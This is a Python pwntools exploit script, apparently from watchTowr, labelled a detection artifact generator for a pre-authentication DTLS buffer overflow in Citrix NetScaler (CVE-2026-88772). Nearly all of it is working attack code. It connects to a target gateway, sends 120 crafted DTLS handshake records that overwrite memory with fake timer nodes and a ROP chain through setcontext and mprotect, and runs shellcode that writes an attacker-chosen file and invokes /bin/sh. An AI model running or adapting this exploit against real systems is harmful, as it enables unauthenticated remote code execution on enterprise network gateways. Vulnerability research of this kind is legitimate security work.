#!/usr/bin/env python3

from pwn import *
import argparse, os, socket, struct
from time import sleep


RECORDS               = 120
LOGICAL_SIZE          = RECORDS
PHYSICAL_PRIMARY_SIZE = LOGICAL_SIZE
RECORD_BODY_SIZE      = 1459
HIDDEN_PAYLOAD_SIZE   = RECORD_BODY_SIZE - 24 - PHYSICAL_PRIMARY_SIZE
HIDDEN_DECLARED_SIZE  = HIDDEN_PAYLOAD_SIZE + LOGICAL_SIZE - 1
SEND_DELAY            = 0.01
POST_DELAY            = 5.0
STARTUP_RETRIES       = 30
STARTUP_RETRY_DELAY   = 2.0
DEFAULT_PORT          = 9462
DEFAULT_PATH          = "/tmp/file.txt"
DEFAULT_CONTENT       = "content"


banner = """                     __         ___  ___________
         __  _  ______ _/  |__ ____ |  |_\\__    ____\\____  _  ________
         \\ \\/ \\/ \\__  \\    ___/ ___\\|  |  \\|    | /  _ \\ \\/ \\/ \\_  __ \\
          \\     / / __ \\|  | \\  \\___|   Y  |    |(  <_> \\     / |  | \\/
           \\/\\_/ (____  |__|  \\___  |___|__|__  | \\__  / \\/\\_/  |__|
                          \\/          \\/     \\/

        watchTowr-vs-Citrix-Netscaler-CVE-2026-88772.py

        (*) Citrix Netscaler DTLS PreAuth buffer overflow to RCE Detection Artifact Generator

          - Sina Kheirkhah (@SinSinology) of watchTowr (@watchTowrcyber)

        CVEs: [CVE-2026-88772]
"""

print(banner)


FIRST_SCRATCH_CONTRIBUTION = 13 + RECORD_BODY_SIZE
LATER_SCRATCH_CONTRIBUTION = RECORD_BODY_SIZE - 12

SCRATCH_BASE             = 0x355BBC0
LIST_TAIL_SCRATCH_OFFSET = 0x357F820 - SCRATCH_BASE
LIST_SENTINEL            = 0x357F7F8

FIRST_TIMER_LIST      = 0x356E870
SECOND_TIMER_LIST     = 0x356DAF8
FAKE_NODE             = 0x355C800
FAKE_METHOD_TABLE     = 0x355D800
JOP_RSI_TO_RDI        = 0x151E638
SETCONTEXT            = 0x1FE7570
POP_RDI_RET           = 0x4E705D
POP_RSI_RET           = 0x44711E
POP_RDX_RET           = 0x4590D2
MPROTECT              = 0x2006480
ROP_STACK             = 0x355E000
SHELLCODE_ADDRESS     = 0x355E100
FREEBSD_MCONTEXT_SIZE = 800
FREEBSD_FPFMT_NODEV   = 0x10000


def freebsd_ucontext(rip, rsp):
    context = bytearray(16 + FREEBSD_MCONTEXT_SIZE)
    struct.pack_into("<Q", context, 0xB0, rip)                  
    struct.pack_into("<Q", context, 0xC0, 0x202)                
    struct.pack_into("<Q", context, 0xC8, rsp)                  
    struct.pack_into("<Q", context, 0xD0, 0x3B)                 
    struct.pack_into("<Q", context, 0xD8, FREEBSD_MCONTEXT_SIZE) 
    struct.pack_into("<Q", context, 0xE0, FREEBSD_FPFMT_NODEV)
    return bytes(context)


def setcontext_control_patches(rip, rsp):
    return (
        (FIRST_TIMER_LIST + 0x6C8 - SCRATCH_BASE, struct.pack("<Q", FIRST_TIMER_LIST)),
        (SECOND_TIMER_LIST + 0x6C8 - SCRATCH_BASE, struct.pack("<Q", FAKE_NODE)),
        (FAKE_NODE - SCRATCH_BASE, freebsd_ucontext(rip, rsp)),
        (FAKE_NODE + 0x618 - SCRATCH_BASE, struct.pack("<Q", FAKE_METHOD_TABLE)),
        (FAKE_NODE + 0x6C8 - SCRATCH_BASE, struct.pack("<Q", SECOND_TIMER_LIST)),
        (FAKE_NODE + 0x6E0 - SCRATCH_BASE, b"\x00" * 4),
        (FAKE_NODE + 0xD32 - SCRATCH_BASE, b"\x00" * 2),
        (FAKE_METHOD_TABLE + 0x18 - SCRATCH_BASE, struct.pack("<Q", SETCONTEXT)),
        (FAKE_METHOD_TABLE + 0xD0 - SCRATCH_BASE, struct.pack("<Q", JOP_RSI_TO_RDI)),
    )


def touch_file_patches(path=DEFAULT_PATH, content=DEFAULT_CONTENT):
    context.clear(arch="amd64", os="freebsd")

    path_bytes = path.encode("utf-8")
    content_bytes = content.encode("utf-8")
    if not path_bytes:
        print("--path cannot be empty")
        exit(1)
    if b"\x00" in path_bytes:
        print("--path cannot contain a NUL byte")
        exit(1)
    if b"\x00" in content_bytes:
        print("--content cannot contain a NUL byte")
        exit(1)
    if len(path_bytes) > 1024:
        print("UTF-8 encoded --path cannot exceed 1024 bytes")
        exit(1)
    if len(content_bytes) > 2048:
        print("UTF-8 encoded --content cannot exceed 2048 bytes")
        exit(1)

    rop = flat(
        ROP_STACK,
        POP_RSI_RET,
        0x1000,
        POP_RDX_RET,
        7,
        MPROTECT,
        SHELLCODE_ADDRESS,
        word_size=64,
    )

    source = shellcraft.pushstr(path_bytes)
    source += shellcraft.syscall(
        constants.SYS_open,
        "rsp",
        constants.O_WRONLY | constants.O_CREAT | constants.O_TRUNC,
        0o644,
    )
    source += "mov r12, rax\n"
    if content_bytes:
        source += shellcraft.pushstr(content_bytes)
    source += shellcraft.syscall(
        constants.SYS_write, "r12", "rsp", len(content_bytes)
    )
    source += shellcraft.syscall(constants.SYS_close, "r12")
    source += shellcraft.pushstr("/bin/sh") #ROBLOX_OOF.mp3
    source += """
        xor eax, eax
        mov al, 15
        mov rdi, rsp
        xor esi, esi
        mov si, 0xd6d
        syscall
    """
    source += "ud2\n"
    shellcode = asm(source)

    if len(rop) > SHELLCODE_ADDRESS - ROP_STACK:
        print("ROP chain overlaps shellcode")
        exit(1)
    if SHELLCODE_ADDRESS + len(shellcode) > ROP_STACK + 0x1000:
        print("the encoded --path and --content make the shellcode too large for the executable page")
        exit(1)

    return setcontext_control_patches(POP_RDI_RET, ROP_STACK) + (
        (ROP_STACK - SCRATCH_BASE, rop),
        (SHELLCODE_ADDRESS - SCRATCH_BASE, shellcode),
    )


def handshake_header(handshake_type, total_length, message_sequence,
                     fragment_offset, fragment_length):
    return (
        bytes([handshake_type])
        + total_length.to_bytes(3, "big")
        + message_sequence.to_bytes(2, "big")
        + fragment_offset.to_bytes(3, "big")
        + fragment_length.to_bytes(3, "big")
    )


def record(payload, sequence):
    return (
        b"\x16\xfe\xff\x00\x00"
        + sequence.to_bytes(6, "big")
        + len(payload).to_bytes(2, "big")
        + payload
    )


def client_hello_body(client_random, cookie=b""):
    cipher_suites = b"\x00\x2f\x00\xff"
    fixed = (
        b"\xfe\xff"
        + client_random
        + b"\x00"
        + bytes([len(cookie)])
        + cookie
        + len(cipher_suites).to_bytes(2, "big")
        + cipher_suites
        + b"\x01\x00"
    )
    extensions = b"\x00\x23\x00\x00\x00\x16\x00\x00\x00\x17\x00\x00"
    return fixed + len(extensions).to_bytes(2, "big") + extensions


def complete_handshake(handshake_type, body, message_sequence):
    return (
        handshake_header(
            handshake_type,
            len(body),
            message_sequence,
            0,
            len(body),
        )
        + body
    )


def get_cookie(sock, client_random):
    hello = client_hello_body(client_random)
    request = record(complete_handshake(1, hello, 0), 0)
    sock.send(request)
    reply = sock.recv(65535)
    if len(reply) < 28 or reply[0] != 22 or reply[13] != 3:
        print(f"unexpected HelloVerifyRequest: {reply[:64].hex()}")
        exit(1)
    cookie_length = reply[27]
    cookie = reply[28 : 28 + cookie_length]
    if len(cookie) != cookie_length:
        print("truncated HelloVerifyRequest cookie")
        exit(1)
    return cookie


def send_primer(sock, client_random, cookie):
    hello = client_hello_body(client_random, cookie)
    request = record(complete_handshake(1, hello, 1), 1)
    sock.send(request)

    responses = 0
    sock.settimeout(0.35)
    try:
        while True:
            reply = sock.recv(65535)
            responses += 1
    except Exception as e:
        return responses
    finally:
        sock.settimeout(4.0)


def scratch_location(offset):
    if offset < 13:
        print("patch would alter the first DTLS record header")
        exit(1)
    if offset < FIRST_SCRATCH_CONTRIBUTION:
        return 0, offset - 13

    later = offset - FIRST_SCRATCH_CONTRIBUTION
    index = 1 + later // LATER_SCRATCH_CONTRIBUTION
    body_offset = 12 + later % LATER_SCRATCH_CONTRIBUTION
    if index >= RECORDS:
        print("patch lies beyond the flattened record chain")
        exit(1)
    return index, body_offset


def build_record_patches(specs):
    result = {}
    for scratch_offset, data in specs:
        for displacement, value in enumerate(data):
            index, body_offset = scratch_location(scratch_offset + displacement)
            result.setdefault(index, {})[body_offset] = value
    return result


def malicious_record(index, patches):
    primary = (
        handshake_header(0x10, LOGICAL_SIZE, 2, index, 1)
        + bytes(PHYSICAL_PRIMARY_SIZE)
    )
    hidden = (
        handshake_header(0x10, HIDDEN_DECLARED_SIZE, 3, 0, HIDDEN_DECLARED_SIZE)
        + b"\xff" * HIDDEN_PAYLOAD_SIZE
    )
    payload = bytearray(primary + hidden)
    for body_offset, value in patches.get(index, {}).items():
        payload[body_offset] = value
    if len(payload) != RECORD_BODY_SIZE:
        print(f"internal record size error: {len(payload):#x}")
        exit(1)
    return record(bytes(payload), 2 + index)


def main():
    ap = argparse.ArgumentParser(description="pre-auth DTLS handshake-chain overflow")
    ap.add_argument("--target", required=True, help="DTLS Gateway VIP")
    ap.add_argument("--port", type=int, default=DEFAULT_PORT)
    ap.add_argument("--path", default=DEFAULT_PATH, help="file to write")
    ap.add_argument("--content", default=DEFAULT_CONTENT, help="file content")
    ap.add_argument(
        "--startup-retries",
        type=int,
        default=STARTUP_RETRIES,
        help="fresh DTLS association attempts while NSPPE is restarting",
    )
    ap.add_argument(
        "--startup-retry-delay",
        type=float,
        default=STARTUP_RETRY_DELAY,
        help="seconds between DTLS association attempts",
    )
    args = ap.parse_args()

    if args.startup_retries < 1:
        ap.error("--startup-retries must be at least 1")
    if args.startup_retry_delay < 0:
        ap.error("--startup-retry-delay cannot be negative")

    patch_specs = [
        (LIST_TAIL_SCRATCH_OFFSET, struct.pack("<Q", LIST_SENTINEL))
    ]
    patch_specs.extend(touch_file_patches(args.path, args.content))

    log.info("building payload for %r" % args.path) ;
    log.success("content size: %d bytes" % len(args.content.encode("utf-8")))
    record_patches = build_record_patches(patch_specs)

    log.info("connecting to DTLS gateway...")
    sock = None
    for attempt in range(1, args.startup_retries + 1):
        candidate = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        candidate.settimeout(4.0)
        candidate.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1 << 20)
        candidate.connect((args.target, args.port))
        try:
            client_random = os.urandom(32)
            cookie = get_cookie(candidate, client_random)
            responses = send_primer(candidate, client_random, cookie)
            if responses == 0:
                raise TimeoutError("the server sent no DTLS flight")
            sock = candidate
            break
        except OSError as error:
            candidate.close()
            if attempt == args.startup_retries:
                raise
            log.warning(
                "association attempt %d/%d failed: %s; retrying in %.1fs"
                % (
                    attempt,
                    args.startup_retries,
                    error,
                    args.startup_retry_delay,
                )
            )
            sleep(args.startup_retry_delay)

    if sock is None:
        raise RuntimeError("failed to create a DTLS association")

    try:
        log.success("association ready: %d server datagrams" % responses)

        total_wire_bytes = 0
        for index in range(RECORDS):
            request = malicious_record(index, record_patches)
            sock.send(request)
            total_wire_bytes += len(request)
            sleep(SEND_DELAY)

        log.info("sending %d records (%d bytes)..." % (RECORDS, total_wire_bytes))
        
        sleep(POST_DELAY)
    finally:
        sock.close()


main()
log.info("done")
